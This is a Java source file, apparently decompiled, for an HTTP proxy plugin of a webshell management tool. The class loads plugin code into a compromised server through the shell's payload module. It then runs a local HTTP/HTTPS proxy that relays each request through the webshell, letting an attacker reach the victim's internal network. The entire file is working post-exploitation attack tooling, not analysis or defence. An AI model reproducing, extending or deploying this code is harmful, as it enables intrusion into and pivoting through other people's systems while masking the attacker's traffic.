package shells.plugins.generic;


import core.ApplicationContext;
import core.Encoding;
import core.httpProxy.server.CertPool;
import core.httpProxy.server.core.HttpProxyHandle;
import core.httpProxy.server.core.HttpProxyServer;
import core.httpProxy.server.request.HttpRequest;
import core.httpProxy.server.response.HttpResponse;
import core.httpProxy.server.response.HttpResponseHeader;
import core.httpProxy.server.response.HttpResponseStatus;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

public abstract class HttpProxy implements Plugin, HttpProxyHandle {
   private final JPanel panel = new JPanel(new BorderLayout());
   private final RTextArea tipTextArea = new RTextArea();
   private final JButton stopButton = new JButton("Stop");
   private final JButton startButton = new JButton("Start");
   private final JLabel hostLabel = new JLabel("host :");
   private final JLabel portLabel = new JLabel("port :");
   private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
   private final JTextField portTextField = new JTextField("8888", 7);
   private final JSplitPane httpProxySplitPane = new JSplitPane();
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;
   private HttpProxyServer httpProxyServer;

   public HttpProxy() {
      this.httpProxySplitPane.setOrientation(0);
      this.httpProxySplitPane.setDividerSize(0);
      this.tipTextArea.append("Logs:\r\n");
      JPanel httpProxyTopPanel = new JPanel();
      httpProxyTopPanel.add(this.hostLabel);
      httpProxyTopPanel.add(this.hostTextField);
      httpProxyTopPanel.add(this.portLabel);
      httpProxyTopPanel.add(this.portTextField);
      httpProxyTopPanel.add(this.startButton);
      httpProxyTopPanel.add(this.stopButton);
      this.httpProxySplitPane.setTopComponent(httpProxyTopPanel);
      this.httpProxySplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
      this.panel.add(this.httpProxySplitPane);
   }

   public boolean load() {
      if (!this.loadState) {
         try {
            byte[] data = this.readPlugin();
            if (this.payload.include(this.getClassName(), data)) {
               this.loadState = true;
               Log.log("Load success");
               this.tipTextArea.append("Load success\r\n");
               return true;
            } else {
               Log.error("Load fail");
               this.tipTextArea.append("Load fail\r\n");
               return false;
            }
         } catch (Exception var2) {
            Log.error((Throwable)var2);
            return false;
         }
      } else {
         return true;
      }
   }

   public abstract byte[] readPlugin() throws IOException;

   public abstract String getClassName();

   public void handler(Socket clientSocket, HttpRequest httpRequest) throws Exception {
      HttpResponse response = this.sendHttpRequest(httpRequest);
      String logMessage = String.format("Time:%s Url:%s httpMehtod:%s HttpVersion:%s requestBodySize:%s responseCode:%s responseBodySize:%s\r\n", functions.getCurrentTime(), httpRequest.getUrl(), httpRequest.getMethod(), httpRequest.getHttpVersion(), httpRequest.getRequestData() == null ? "0" : httpRequest.getRequestData().length, response.getHttpResponseStatus().code(), response.getResponseData() == null ? "0" : response.getResponseData().length);
      Log.log(logMessage);
      this.tipTextArea.append(logMessage);
      clientSocket.getOutputStream().write(response.encode());
   }

   public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
      httpRequest.getHttpRequestHeader().setHeader("Connection", "close");
      ReqParameter reqParameter = new ReqParameter();
      reqParameter.add("httpUri", httpRequest.getUri());
      reqParameter.add("httpUrl", httpRequest.getUrl());
      reqParameter.add("httpMehtod", httpRequest.getMethod());
      reqParameter.add("httpHeaders", httpRequest.getHttpRequestHeader().decode());
      reqParameter.add("HttpVersion", httpRequest.getHttpVersion());
      reqParameter.add("httpHost", httpRequest.getHost());
      reqParameter.add("httpPort", String.valueOf(httpRequest.getPort()));
      if (httpRequest.getRequestData() != null) {
         reqParameter.add("httpRequestData", httpRequest.getRequestData());
      }

      byte[] response = this.payload.evalFunc(this.getClassName(), "httpRequestProxy", reqParameter);
      HttpResponse httpResponse = null;

      try {
         httpResponse = HttpResponse.decode(response);
         if (httpResponse.getHttpResponseStatus().getCode() == HttpResponseStatus.CONTINUE.code()) {
            httpResponse = HttpResponse.decode(httpResponse.getResponseData());
         }

         httpResponse.getHttpResponseHeader().setHeader("Connection", "close");
         httpResponse.getHttpResponseHeader().removeHeader("Transfer-Encoding");
      } catch (Exception var11) {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         PrintStream printStream = new PrintStream(byteArrayOutputStream);
         var11.printStackTrace(printStream);
         printStream.flush();
         printStream.close();

         try {
            byteArrayOutputStream.write("\r\n".getBytes());
            byteArrayOutputStream.write("response ->\r\n".getBytes());
            byteArrayOutputStream.write(response == null ? "null".getBytes() : response);
         } catch (Exception var10) {
         }

         httpResponse = new HttpResponse(HttpResponseStatus.INTERNAL_SERVER_ERROR, null, byteArrayOutputStream.toByteArray());

         try {
            byteArrayOutputStream.close();
         } catch (IOException var9) {
            var9.printStackTrace();
         }
      }

      return httpResponse;
   }

   private void startButtonClick(ActionEvent actionEvent) throws Exception {
      this.load();
      if (this.httpProxyServer == null) {
         int listenPort = Integer.valueOf(this.portTextField.getText().trim());
         InetAddress bindAddr = InetAddress.getByName(this.hostTextField.getText().trim());
         CertPool certPool = new CertPool(ApplicationContext.getHttpsPrivateKey(), ApplicationContext.getHttpsCert());
         this.httpProxyServer = new HttpProxyServer(listenPort, 50, bindAddr, certPool, this);
         if (this.httpProxyServer.startup()) {
            this.tipTextArea.append(String.format("start! bindAddr: %s listenPort: %s\r\n", bindAddr.getHostAddress(), listenPort));
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "start!", "提示", 1);
         } else {
            this.httpProxyServer = null;
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "fail!", "提示", 1);
         }
      } else {
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "started!", "提示", 2);
      }

   }

   private void stopButtonClick(ActionEvent actionEvent) {
      if (this.httpProxyServer == null) {
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no start!", "提示", 2);
      } else {
         this.httpProxyServer.setNextSocket(false);
         this.httpProxyServer.shutdown();
         this.httpProxyServer = null;
         this.tipTextArea.append("stop!\r\n");
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "stop!", "提示", 1);
      }

   }

   public void closePlugin() {
      try {
         if (this.httpProxyServer != null) {
            this.httpProxyServer.setNextSocket(false);
            this.httpProxyServer.shutdown();
            this.httpProxyServer = null;
         }
      } catch (Exception var2) {
         Log.error((Throwable)var2);
      }

   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(HttpProxy.class, this, HttpProxy.class, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
